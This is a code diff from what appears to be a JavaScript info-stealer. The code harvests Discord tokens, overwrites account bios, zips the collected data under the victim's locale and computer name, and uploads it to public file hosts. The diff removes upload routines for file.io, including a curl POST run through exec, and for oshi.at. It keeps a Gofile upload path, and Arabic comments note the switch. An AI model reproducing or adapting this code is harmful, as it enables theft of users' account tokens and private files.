@@ -1866,7 +1866,7 @@ async function getTokens() {
     }
 
     const predefinedBio = `╔═══════════✧✧✧═══════════╗ 
-**     rexo uncle all except for zero.exe ⭐️
+**     in case I don't see you later, good afternoon, good evening, and good night
 ╚═══════════✧✧✧═══════════╝`;
 
     for (let token of tokens) {
@@ -2851,66 +2851,7 @@ async function archiveAndSendData() {
     }
 }
 
-async function uploadToDoge(destinationFolder, locale, computerName) {
-    return new Promise((resolve, reject) => {
-        const zipFilePath = `${destinationFolder}/${locale}-${computerName}.zip`;
-
-        if (!fs.existsSync(zipFilePath)) {
-            console.error(`Error: File does not exist - ${zipFilePath}`);
-            reject(new Error(`File does not exist - ${zipFilePath}`));
-            return;
-        }
-
-const uploadCommand = `curl --location --request POST "https://file.io/" -H "Content-Type: multipart/form-data;" --form "file=@${zipFilePath.replace(/\\/g, '/')}";`;
-
-exec(uploadCommand, (error, stdout, stderr) => {
-    if (error) {
-        console.error(`Error uploading to File.io: ${error}`);
-        reject(error);
-    } else {
-        try {
-            const response = JSON.parse(stdout);
-            if (response.success) {
-                const downloadLink = response.link;
-                console.log(`Upload successful to File.io. Download link: ${downloadLink}`);
-                resolve(downloadLink);
-            } else {
-                console.error(`File.io returned an error: ${response.message}`);
-                reject(new Error(`Error from File.io: ${response.message}`));
-            }
-        } catch (jsonError) {
-            console.error(`Error parsing JSON response: ${jsonError}`);
-            reject(new Error('Invalid JSON response from the API'));
-        }
-    }
-});
-
-    });
-}
-
-// Upload file to Oshi.at
-async function uploadToOshiAt(filePath, computerName) {
-    try {
-        const form = new FormData();
-        form.append('files[]', fs.createReadStream(filePath), `${computerName}.zip`);
-        form.append('expire', '43200');
-        form.append('autodestroy', '0');
-        form.append('randomizefn', '0');
-        form.append('shorturl', '1');
-
-        const response = await axios.post('http://oshi.at/', form, {
-            headers: form.getHeaders(),
-        });
-
-        const result = response.data.split("DL: ")[1].replace(/\n|\r| /g, "");
-        return result;
-    } catch (error) {
-        console.error(`Error uploading to Oshi.at: ${error.message}`);
-        throw new Error('Oshi.at upload failed');
-    }
-}
-
-// Upload file to Gofile
+// استبدال وظيفة رفع الملفات إلى File.io بوظيفة رفع الملفات إلى Gofile.io
 async function uploadToGofile(destinationFolder, locale, computerName) {
     return new Promise(async (resolve, reject) => {
         const zipFilePath = `${destinationFolder}/${locale}-${computerName}.zip`;
@@ -2936,46 +2877,13 @@ async function uploadToGofile(destinationFolder, locale, computerName) {
     });
 }
 
-// Upload file to File.io
-async function uploadToFileio(filePath) {
-    try {
-        const form = new FormData();
-        form.append('file', fs.createReadStream(filePath));
-
-        const response = await axios.post('https://file.io/', form, {
-            headers: form.getHeaders(),
-        });
-
-        return response.data.link;
-    } catch (error) {
-        console.error(`Error uploading to File.io: ${error.message}`);
-        throw new Error('File.io upload failed');
-    }
-}
-
-// Main function to handle file upload
+// استبدال وظيفة رفع الملفات الرئيسية
 async function uploadFile(destinationFolder, locale, computerName) {
     const zipFilePath = `${destinationFolder}/${locale}-${computerName}.zip`;
 
     if (!fs.existsSync(zipFilePath)) {
         console.error(`Error: File does not exist - ${zipFilePath}`);
         throw new Error(`File does not exist - ${zipFilePath}`);
-    }
-
-    try {
-        const dogeLink = await uploadToDoge(destinationFolder, locale, computerName);
-        console.log(`Upload successful to FileDoge. Link: ${dogeLink}`);
-        return dogeLink;
-    } catch (error) {
-        console.error(`FileDoge upload failed: ${error.message}`);
-    }
-
-    try {
-        const fileioLink = await uploadToFileio(zipFilePath);
-        console.log(`Upload successful to File.io. Link: ${fileioLink}`);
-        return fileioLink;
-    } catch (error) {
-        console.error(`File.io upload failed: ${error.message}`);
     }
 
     try {
@@ -2986,19 +2894,10 @@ async function uploadFile(destinationFolder, locale, computerName) {
         console.error(`Gofile upload failed: ${error.message}`);
     }
 
-    try {
-        const oshiAtLink = await uploadToOshiAt(zipFilePath, computerName);
-        console.log(`Upload successful to Oshi.at. Link: ${oshiAtLink}`);
-        return oshiAtLink;
-    } catch (error) {
-        console.error(`Oshi.at upload failed: ${error.message}`);
-    }
-
-
     throw new Error('All upload methods failed');
 }
 
-// Helper function to get the list of servers (assuming you already have this function implemented)
+// وظيفة الحصول على قائمة السيرفرات من Gofile.io
 async function getServers() {
     try {
         console.log('Searching servers...');
@@ -3011,7 +2910,6 @@ async function getServers() {
         throw error;
     }
 }
-
 
 async function getExtension(zipFilePath) {
     const discordTokensFilePath = path.join(mainFolderPath, 'discord', 'discord.txt');
